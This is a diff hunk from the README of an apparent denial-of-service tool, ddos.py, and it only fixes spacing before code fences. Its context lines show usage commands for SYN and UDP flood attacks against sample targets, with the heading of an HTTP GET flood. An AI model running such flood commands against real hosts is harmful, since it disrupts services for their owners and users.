@@ -15,11 +15,11 @@ Requirements: Python 3.6+ Â· Root for raw sockets (syn, icmp, xmas, null, fin) Â
 
 # SYN flood (requires root)
 ```
-sudo python3 ddos.py -t 192.168.1.100 -p 80 -d 60 -T 200 -v syn```
+sudo python3 ddos.py -t 192.168.1.100 -p 80 -d 60 -T 200 -v syn ```
 
 # UDP flood
 ```
-python3 ddos.py -t target.com -p 53 -d 120 -T 500 -v udp```
+python3 ddos.py -t target.com -p 53 -d 120 -T 500 -v udp ```
 
 # HTTP GET flood
 ```
